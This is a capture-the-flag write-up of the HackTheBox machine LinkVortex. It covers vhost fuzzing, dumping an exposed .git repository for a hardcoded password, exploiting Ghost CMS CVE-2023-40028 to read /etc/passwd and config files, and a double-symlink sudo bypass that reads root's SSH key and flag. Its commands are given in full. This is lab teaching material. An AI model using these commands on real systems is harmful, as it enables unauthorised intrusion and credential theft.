+++
date = '2026-08-05T15:29:18+02:00'
draft = false
title = 'LinkVortex Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`26/01/2025`**

![LinkVortex.png](/images/imgs_linkvortex/LinkVortex.png)

---
# Introduction

**_LinkVortex_** is an **Easy-level Linux** machine that highlights the risks of exposed `.git` directories and insecure bash scripting. 

The initial foothold requires discovering a development virtual host and dumping its exposed **Git** repository. By restoring uncommitted changes, I recovered hardcoded credentials to log into a **Ghost CMS** instance. The CMS version was vulnerable to **CVE-2023-40028**, an **authenticated arbitrary file read** vulnerability, which allowed me to read the **Ghost** configuration file and obtain **SSH** credentials for a user.
Finally, Privilege Escalation involves a custom bash script that can be run as **root** via `sudo`. By exploiting a logic flaw in how the script resolves symbolic links (**double symlink bypass**) and manipulating an environment variable, it was possible to trick the script into reading the **root flag**.

---
# Techniques Used

- **Virtual Host Enumeration**
- **Git Repository Dumping & Recovery**
- **Ghost CMS Arbitrary File Read (CVE-2023-40028)**
- **Double Symlink Bypass**

---
# Enumeration

## nmap

Initial full port scan:

```bash
nmap -p- linkvortex -T5
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV linkvortex -T5
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to [http://linkvortex.htb/](http://linkvortex.htb/)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I added **`linkvortex.htb`** to my **`/etc/hosts`** file.

## Web Enumeration

![web1.png](/images/imgs_linkvortex/web1.png)

I started directory and virtual host enumeration. While **directory fuzzing** didn't yield much, **virtual host fuzzing** revealed a development subdomain:

```bash
ffuf -u [http://linkvortex.htb](http://linkvortex.htb) -H "Host: FUZZ.linkvortex.htb" -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -fs 230
```

![fuzzing.png](/images/imgs_linkvortex/fuzzing.png)

I added **`dev.linkvortex.htb`** to my **`/etc/hosts`** file.
Browsing to **http://dev.linkvortex.htb** simply showed a page with a "**Launching soon**" div.

![web2.png](/images/imgs_linkvortex/web2.png)

I ran **Gobuster** on the newly found vhost:

```bash
gobuster dir -u [http://dev.linkvortex.htb/](http://dev.linkvortex.htb/) -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

![gob.png](/images/imgs_linkvortex/gob.png)

The scan discovered an exposed **`.git`** directory.

---
# Initial Access | Git Dump & Ghost CMS (CVE-2023-40028)

I downloaded the entire repository using **git-dumper**:

```bash
git clone [https://github.com/arthaud/git-dumper.git](https://github.com/arthaud/git-dumper.git)
python3 -m venv venv && source venv/bin/activate
pip3 install -r requirements.txt
python3 git-dumper.py [http://dev.linkvortex.htb](http://dev.linkvortex.htb) gitdump
```

![git.png](/images/imgs_linkvortex/git.png)

Once inside the **`gitdump`** directory, I checked the repository status and the commit history:

```bash
cd gitdump
git status
git show 299cdb4387763f850887275a716153e84793077d
git show dce2e68c9a620e9534f723a94dbb5f33c9e43034
```

The git status output revealed some uncommitted staged changes:

```text
Not currently on any branch.
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
    new file:   Dockerfile.ghost
    modified:   ghost/core/test/regression/api/admin/authentication.test.js 
```

I restored the staged files to view their contents:

```bash
git restore --staged .
git diff
```

![git2.png](/images/imgs_linkvortex/git2.png)

I found an hardcoded password: **OctopiFociPilfer45**. However, I was initially stuck because I lacked a valid username.

I searched online for the default **Ghost CMS** login page (**`/ghost`**) and navigated to http://linkvortex.htb/ghost. 

**Note**: _On the main website, I noticed some posts were authored by **admin**. In **HackTheBox** machines, it is a very common practice to construct email addresses by combining discovered usernames with the machine's domain. Following this logic, I guessed the email might be **admin@linkvortex.htb**._

The credentials worked, and I successfully logged in.

Checking the settings (**Settings --> About Ghost**), I found the version: **`5.58.0`**.

![logged.png](/images/imgs_linkvortex/logged.png)

Initially, I thought about exploiting the "**Code Injection**" feature, but after a quick search, I discovered that this specific version is vulnerable to **CVE-2023-40028**.

**Note**: _This is an **authenticated Arbitrary File Read** vulnerability. The flaw exists in how **Ghost CMS** processes image uploads or specific theme files. An attacker can craft a malicious file containing symbolic links or path traversal payloads that, once processed by the backend, allow reading any local file on the server without needing **Remote Code Execution**._

Interestingly, the **PoC** I found was written by **0xyassine** (the creator of the **LinkVortex** box), which confirmed I was on the right path.

I modified the exploit parameters and ran it to read **`/etc/passwd`**:

```bash
./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
```

![cve1.png](/images/imgs_linkvortex/cve1.png)

I found a user named **node**, but trying to **SSH** into the machine with the known password failed.

Since I had an **arbitrary file read**, I decided to look for configuration files. A quick Google search revealed that **Ghost** stores its configurations in:

**`/var/www/ghost/config.production.json` (or in `/var/lib`)**.

I used the exploit again to read it and found valid credentials:

![config.png](/images/imgs_linkvortex/config.png)

I used these credentials to **SSH** into the machine and grabbed the **user flag**.

![userf.png](/images/imgs_linkvortex/userf.png)

---
# Privilege Escalation | Sudo Misconfiguration & Symlink Bypass

I checked **sudo** privileges using **`sudo -l`**:

![sudol.png](/images/imgs_linkvortex/sudol.png)

I inspected the script to understand its logic.

**Note**: _The script contains a critical logic flaw in how it validates **symbolic links**. It uses **`/usr/bin/readlink $LINK`** to get the target and checks if it contains the words **etc** or **root**. The problem is that readlink is not recursive (unlike **`readlink -f`**). If we create a symlink (**`fall.png`**) that points to another symlink (**`fall.txt`**), which in turn points to **`/root/root.txt`**, the script will only see **`fall.txt`**. Since **`fall.txt`** does not trigger the grep filter, the script bypasses the security check and accepts it. Moreover, by prepending **`CHECK_CONTENT=true`** to our sudo command, the script will execute the cat command on our file as **root**._

I applied this **double symlink bypass** to retrieve the **SSH key** first:

```bash
ln -s /root/.ssh/id_rsa fall.txt
ln -s /home/bob/fall.txt fall.png

sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh fall.png
```

I successfully retrieved the **SSH key**, but attempting to connect with it resulted in a **libcrypto error** (likely due to SSH daemon restrictions).

Since the method worked perfectly, I just repeated the same process to directly read the **root flag** instead:

```bash
rm fall.txt fall.png
ln -s /root/root.txt fall.txt
ln -s /home/bob/fall.txt fall.png

sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh fall.png
```

![rootf.png](/images/imgs_linkvortex/rootf.png)

---
# Final Thoughts

**_LinkVortex_** is a well-balanced machine.

The initial foothold rewards basic enumeration habits: fuzzing for virtual hosts and always checking for exposed **.git** directories. The usage of **git-dumper** and analyzing uncommitted changes is a very realistic scenario that happens often in real-world web application pentesting.

The Privilege Escalation phase was definitely the highlight. Analyzing the bash script and exploiting the non-recursive nature of readlink through a **double symlink bypass** is an elegant trick.

**Sources**:

- **Git Dumper | https://github.com/arthaud/git-dumper**

- **Ghost CMS Arbitrary File Read (CVE-2023-40028) | https://github.com/0xyassine/CVE-2023-40028**
